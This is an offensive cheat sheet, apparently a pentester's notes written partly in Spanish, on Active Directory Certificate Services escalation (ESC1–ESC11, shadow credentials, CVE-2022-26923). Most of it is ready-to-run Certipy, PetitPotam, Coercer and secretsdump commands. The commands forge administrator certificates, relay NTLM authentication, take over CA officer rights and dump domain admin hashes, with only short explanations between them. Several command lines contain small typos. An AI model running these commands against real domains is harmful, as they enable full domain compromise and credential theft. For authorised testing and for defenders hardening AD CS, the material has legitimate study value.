# AD CS Domain Escalation

> Si certipy funca mal con LDAPS usar `--scheme ldap`

Y si falla algo con python usar docker

```Dockerfile
# Dockerfile
FROM python:3.10.4-slim-buster
RUN pip install --upgrade pip
RUN pip install certipy-ad
WORKDIR /tmp
```

```bash
sudo docker run -it -v --rm certipy:latest certipy find -u user@domain.local -p 'newP@ssword2022' -vulnerable -ns 192.168.210.10 -bloodhound
```

## Check vulnerabilities

```bash
certipy find -u username@domain.com -p 'pass' -vulnerable -dc-ip DCIP -stdout
# Export bloodhound 
certipy find -u username@domain.com -p 'pass' -vulnerable -dc-ip DCIP -bloodhound
```

## Misconfigurations


### Misconfigured Certificate Templates - ESC1

Request a certificate from a vulnerable template

![Alt text](/Images/image-2.png)

```bash
certipy req -u username@domain.com -p 'pass' -target <CAs DNS Name> -template <Template Name> -ca <Certificate Authorities> -upn administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip $ip
```

### Misconfigured Certificate Templates - ESC2

Template can be used for any purpose

![Alt text](/Images/image-3.png)

```bash
# Query cert
certipy req -u username@domain.com -p 'pass' -target <CAs DNS Name> -template <Template Name> -ca <Certificate Authorities>
# Query cert with the Certificate Request Agent certificate we get before (-pfx)
certipy req -u khal.drogo@essos.local -p 'horse' -target <CAs DNS Name> -template User -ca <Certificate Authorities> -on-behalf-of 'DOMAINnotdotcom\administrator' -pfx username.pfx #User is a template
# Auth
certipy auth -pfx administrator.pfx -dc-ip $ip
```

### Misconfigured Enrolment Agent Templates - ESC3

Use an enrollment agent to request a certificate

![Alt text](/Images/image-4.png)

```bash
certipy req -u username@domain.com -p 'pass' -target <CAs DNS Name> -template <Template Name  ESC3-CRA> -ca <Certificate Authorities>
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template <Template Name> -ca <Certificate Authorities> -on-behalf-of 'DOMAINnotdotcom\administrator' -pfx username.pfx
certipy auth -pfx administrator.pfx -username administrator -domain domain.com -dc-ip DCIP
```

### Vulnerable Certificate Template Access Control - ESC4

Write privilege over a certificate template

![Alt text](/Images/image-5.png)

```bash
#Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn’t set the target here as we target the ldap)
certipy template -u user@domain.com -p 'Password' - template <Template Name> -save-old -debug
#Exploit ESC1 on the modified ESC4 template
certipy req -u username@domain.com -p 'pass' -target <CAs DNS Name> -template <Template Name> -ca <Certificate Authorities> -upn administrator@domain.com
# Auth
certipy auth -pfx administrator.pfx -dc-ip $ip
#Rollback the template configuration
certipy template -u user@domain.com -p 'Password' - template <Template Name> -configuration <Template Name>.json
```

### Vulnerable PKI Object Access Control - ESC5

ESC5 is when objects outside of certificate templates and the certificate authority itself can have a security impact on the entire AD CS system, for instance the CA server’s AD computer object or the CA server’s RPC/DCOM server. This escalation technique has not been implemented in Certipy, because it’s too abstract. However, if the CA server is compromised, you can perform the ESC7 escalation.

```cmd
certify.exe pkiobjects
```

### EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration. After the patch for reported vulnerability CVE-2022–26923, this technique no longer works alone, but must be combined with ESC10.

> This also mean that if you got an administrator access on the certificate server you can change this attribute to exploit ESC1 without being domain admin

![Alt text](/Images/image-6.png)

```bash
certipy req -u user@domain.com -p 'Password' -target <DNS Name> -template User -ca <CA Name> -upn administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip DCIP
```

### Vulnerable Certificate Authority Access Control - ESC7

ESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. While there are no public techniques that can abuse only the Manage Certificates access right for domain privilege escalation, we can still use it to issue or deny pending certificate requests.

If we don’t have the Manage Certificates access right, we can just add ourselves as a new “officer”

![Alt text](/Images/image-7.png)

```bash
certipy ca -u 'username@domain.com' -p 'password' -ca 'CA Name' -add-officer 'username'
```

![Alt text](/Images/image-8.png)

List and enable SubCA or another vulnerable template

> The SubCA certificate template is interesting because it is vulnerable to ESC1 

```bash
certipy ca -u 'username@domain.com' -p 'password' -ca 'CA Name'  -list-templates
certipy ca -u 'username@domain.com' -p 'password' -ca 'CA Name' -enable-template SubCA
# Obtain private key
certipy req -u username@domain.com -p 'pass' -template <Template Name> -ca <CA Name> -upn administrator@domain.com
# error but save private key
certipy ca -u username@domain.com -p 'pass' -template <Template Name> -ca <CA Name> -issue-request <request id>
certipy req -u username@domain.com -p 'pass' -ca <CA Name> -retrieve <request id>
certipy auth -pfx administrator.pfx -dc-ip DCIP
```

### NTLM Relay to AD CS HTTP Endpoints - ESC8

ESC8 is when an Enrollment Service has installed and enabled HTTP Web Enrollment.

```bash
sudo certipy relay -ca <DNS Name or IP> -template DomainController
petitpotam.py listenerIP DCIP
certipy auth -pfx DC.pfx -dc-ip DCIP
```

###  No Security Extension - ESC9

ESC9 refers to the new msPKI-Enrollment-Flag value CT_FLAG_NO_SECURITY_EXTENSION (0x80000). If this flag is set on a certificate template, the new szOID_NTDS_CA_SECURITY_EXT security extension will not be embedded. ESC9 is only useful when StrongCertificateBindingEnforcement is set to 1 (default), since a weaker certificate mapping configuration for Kerberos or Schannel can be abused as ESC10 — without ESC9 — as the requirements will be the same.

#### Conditions 

- StrongCertificateBindingEnforcement set to 0
- Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value
- Certificate specifies any client authentication EKU

#### Requisities
- GenericWrite over any account A to compromise any account B

```bash
certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn Administrator
certipy req -username ‘targetUsername@domain.com’ -hashes <hashusernameTarget’ -ca <CA NAME> -template <Template Name>
certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn ‘targetUsername@domain.com’
certipy auth -pfx administrator.pfx -domain domain.com
```

### Weak Certificate Mappings - ESC10

To abuse these misconfigurations, the attacker needs GenericWrite over any account A that is allowed to enroll in a certificate with client authentication to compromise account B (target).

#### Case 1

##### Conditions 

- StrongCertificateBindingEnforcement set to 0

#### Requisities
- GenericWrite over any account A to compromise any account B

```bash
certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn Administrator
certipy req -ca ‘any certificate that permits client authentication> -username ‘targetUsername@domain.com’ -hashes <hash targetUsername> 
certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn ‘targetUsername@domain.com’
certipy auth -pfx administrator.pfx -domain domain.com
```

#### Case 2

##### Conditions 

- CertificateMappingMethods contains UPN bit flag (0x4)

#### Requisities
- GenericWrite over any account A to compromise any account B without a userPrincipalName property (machine accounts and built-in domain administrator Administrator)

```bash
certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn DC01$@domain.com
certipy req -ca ‘any certificate that permits client authentication> -username ‘targetUsername@domain.com’ -hashes <hash targetUsername> 
certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn ‘targetUsername@domain.com’
certipy auth -pfx dc01.pfx -dc-ip DCIP -ldap-shell
```

> One of the available commands for the LDAP shell is set_rbcd which will set Resource-Based Constrained Delegation (RBCD) on the target. So we could perform a RBCD attack to compromise the domain controller.

### Request Encryption is disabled - ESC11

> For domain controllers, we must specify -template DomainController

```bash
certipy relay -target 'rpc://<DNS>' -ca <CA NAME>
petitpotam.py listenerIP DCIP #or 
python3 Coercer.py -t <targetIP or DNS> -u username -p ‘password’ -d domain.com -l listernerIP
certipy auth -pfx DC.pfx -dc-ip DCIP
```

### Shadow Credentials

Shadow credentials attack consist of using the GenericAll or GenericWrite privilege on a user or computer to set up the attribute msDS-KeyCredentialLink

>  If you can write to the msDS-KeyCredentialLink property of a user/computer, you can retrieve the NT hash of that object.

```bash
certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
```

## CVEs

### CVE-2022-26923

> The May 2022 Security Update for Windows systems includes a patch for CVE-2022-26923

```bash
certipy account create -u username@domain.com -p 'pass' -user 'certifriedpc' -pass 'certifriedpass' -dns 'dc.domain.com'
certipy req -u 'certifriedpc$'@domain.com -p 'certifriedpass' -target <DNS NAME> -ca <CA NAME> -template Machine
certipy auth -pfx <DNS hostname>.pfx -username '<DNS hostname>$' -domain domain.com -dc-ip DCIP
#Obtained .ccache kerberos 
export KRB5CCNAME=/path/to/<DNS hostname>.ccache
python3 secretsdump.py -k -no-pass -just-dc-user administrator domain.com/'<DNS hostname>$'@<DNS hostname>.essos.local
# And delete
certipy account delete -u administrator@domain.com -hashes '<hash obtained>' -user 'certifriedpc'
```

### References

- https://github.com/ly4k/BloodHound
- https://github.com/ly4k/Certipy
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
- https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
